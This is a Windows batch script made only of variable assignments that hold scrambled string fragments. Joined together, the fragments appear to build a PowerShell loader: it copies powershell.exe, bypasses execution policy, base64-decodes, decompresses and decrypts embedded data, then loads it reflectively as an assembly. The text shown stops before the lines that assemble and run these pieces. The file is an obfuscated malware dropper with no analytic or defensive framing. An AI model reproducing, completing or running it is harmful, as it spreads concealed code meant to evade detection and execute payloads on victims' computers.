@echo off
set "EPMFiLTWaw=do"
set "XnLCXdHwlF=we"
set "ZuaHfGLFwo=ll"
set "KfrtAzmIcY=Sy"
set "XnpWiNNGBz=.e"
set "AFmCYqeFOi=y "
set "NJBkcVsdKW=1."
set "xcmdbfddsj=ow"
set "ymhgzwhXXE=xe"
set "UtsZDFFBfD=rS"
set "AmiCytxovX=ll"
set "UiLUnzVxVx=em"
set "qFzxfIlPAk=0\"
set "nqyiDGtWta= /"
set "vcUHRbMbWO=he"
set "DuCXVwDtzs=he"
set "HjRtazhsCy=ws"
set "RIOaNsbuVT=st"
set "SubtrOqsvl=\W"
set "WIOKHGyphO=co"
set "QgORZrLSDB=32"
set "EnHznHWOPK=nd"
set "iCcKItlHOx=Po"
set "RLgWEOkchd=\v"
set "eoMZVWjvde= C"
set "RKUTaQKXAD=we"
set "OwUgdCuxga=in"
set "vnxWZXmddJ=Wi"
set "wesjDQRQaX=s\"
set "ZluYXTHduZ=py"
set "hrgiLKVYcc=po"
set "buEzGllJRW=rs"
set "NUiqGNxDKk=:\"
set "DTXKipSDiU=cd"
set "cBakUFcQHu= %~dp0"
set "cHxGUkJyDJ=Comp"
set "OKeCimrGTm=rtS4"
set "iujeYpybAm=O.Me"
set "bJEekxfAIl= = N"
set "GIwwaRyquJ= [Sy"
set "ERQNgzQFGh=.Sec"
set "QXlAvTeTIn=null"
set "SopOrbexPj=fWvm"
set "gKozPpDrof=-4] "
set "CZJZtKKzgi=aDNK"
set "wFIqvJGIQR=Secu"
set "FMwOblDIEh=::De"
set "gkBddImobe=.-16"
set "PjYDrsmDMh=.Cre"
set "xkEBwUuCTh=ress"
set "lacrbIDwKE=QgLO"
set "sRTuajqaCC=trea"
set "wyvrpDTWUe= if "
set "hrivbRYVpd=WvmS"
set "UvRkflbykr=.IO."
set "ySurbnFAhb=1] -"
set "PmuqvFtwtz=oint"
set "kfnrPwlqKQ=[Env"
set "zTYUQgDbPZ=pres"
set "hBQEdVvFEs=y.Cr"
set "zCnRPTduUL=ct S"
set "xPxtaWXfme= '')"
set "ysllQxaqss=);$w"
set "gcONnVAoIw=GID."
set "bWMWZUxuHU=n ''"
set "xIZubBvHgz=LY.D"
set "uZPygtYkYx=.Mod"
set "YbjyNvxMZa=oin "
set "sbxQfWuVTG=)($f"
set "HyjzpnVUqp=ose("
set "gvDWyhMBby=mS);"
set "QxIvWHKKCt=ring"
set "KGGjtzcRcc=daeR"
set "MsSrpTlPES=esaB"
set "dqiDciVLcN=join"
set "imfvaQilGv=bypa"
set "GJuJWgNfqx=oL'["
set "LnEVIPuNGm=('da"
set "pEoFiHlJVc= [Sy"
set "utYRXsXBLz=rans"
set "XIyuxIJceH=Mode"
set "hYuZQtggpM=[Sys"
set "wDFVgPNKzI=ddin"
set "KviZEvSDMk=ne);"
set "UwHyxCNTSx='[-1"
set "yNarzAlcfc=brea"
set "jFnKaPDjlr=Conv"
set "WUEgfPaftW=ispo"
set "vYjjqZZGNs=rt]:"
set "BKXdVaBPkI=$HTx"
set "zCiSteYpAH=em.C"
set "dDAbhaBkiO=eVGI"
set "DkrmckFgeg== [S"
set "nTZhtCOZSy=grap"
set "okbDFpKbCY=Stre"
set "qAYOgGgftR=ew-O"
set "JQitwugOfl=();$"
set "MiOdPphrft=[]] "
set "yKEKamQOpv=rR.T"
set "HEpdToSnDW=3); "
set "JVhBHhjdbN=bys."
set "HGTYvBPSLz=dV1k"
set "giElRyNZvd=ct S"
set "OxAIdvBaOo=wHq "
set "vnfxGTJSMf=ay()"
set "ujJjQlHHaG=eam("
set "xSCrgPGgMn=6esa"
set "qGUfmyUHhS=ss -"
set "RfXJLrOzxZ=ID, "
set "KQhqDpChEk=$fWv"
set "QhNdQzjdwi=:('g"
set "WhrXvZabIQ=TxXe"
set "JjRLybRnEV=7;$H"
set "iazIFVooUD=VRcC"
set "QtGbgCKJYa=gnir"
set "eSmCdFZhJK=]::("
set "CwQkMyVqTR=WvmS"
set "ndymSkYHyl=pStr"
set "aGYtXAvibh=pose"
set "CLCgWDoqfi=..-1"
set "UzBsBmSYOY=morF"
set "jEPYiAUHbQ=TxXe"
set "zicEoWfhrk=;$Dm"
set "UtIimxdzzz='')("
set "slqXwfyXIo=Obje"
set "PbKBnKEhto=('%*'"
set "kIZJPQqHUi=;$eV"
set "wLOoyHsNaB=pose"
set "SXCvgxAoLm=..-1"
set "gffXxYUNgx=$wlo"
set "QNlPDSEKnH===')"
